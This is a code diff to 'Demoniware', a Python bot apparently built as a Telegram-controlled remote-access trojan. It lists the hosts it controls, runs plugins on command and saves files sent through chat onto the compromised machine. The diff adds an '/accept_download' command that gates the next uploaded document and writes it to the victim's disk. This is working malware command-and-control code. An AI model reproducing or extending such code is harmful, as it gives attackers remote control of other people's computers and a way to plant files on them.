@@ -50,6 +50,7 @@ class Demoniware(object):
         self.platform = sys.platform
         self.system = platform.system()
 
+        self.accept_download = False
 
         self.start_time = datetime.now()
 
@@ -99,8 +100,10 @@ class Demoniware(object):
                     else:
                         self.actions(msg['text'], chat_id)
                 elif content_type == 'document':
-                    self.bot.download_file(msg['document']['file_id'], msg['document']['file_name'])
-                    self.send_message(chat_id, 'The file {fname} has been saved to {cwd}'.format(fname=msg['document']['file_name'], cwd=os.getcwd()))
+                    if self.accept_download:
+                        self.bot.download_file(msg['document']['file_id'], msg['document']['file_name'])
+                        self.send_message(chat_id, 'The file {fname} has been saved to {cwd}'.format(fname=msg['document']['file_name'], cwd=os.getcwd()))
+                        self.accept_download = False
         else:
             self.send_message(chat_id, 'Fuck off!')
 
@@ -136,6 +139,9 @@ class Demoniware(object):
             self.send_message(chat_id, '{} [started at {}]'.format(self.node, self.start_time))
 
         elif cmd[0].lower() in self.node.lower() and len(cmd) >= 2:
+            if cmd[1] == '/accept_download':
+                self.accept_download = True
+                self.send_message(chat_id, 'Waiting for document...')
             if cmd[1] in self.command_routes.keys():
                 pname = self.command_routes[cmd[1]]
                 plugin = self.plugins[pname]
@@ -149,7 +155,8 @@ class Demoniware(object):
         elif '/help' in cmd[0]:
             msg = """[+] - Commands Available - [+]
             /help - show this message
-            /hosts - show the hostname of all hosts availables"""
+            /hosts - show the hostname of all hosts availables
+            HOSTNAME /accept_download - accepts the next uploaded document"""
 
             for plugin in self.plugins.keys():
                 msg += """\n\n[+] - Plugin: {plugin_name} - [+]""".format(plugin_name=plugin)
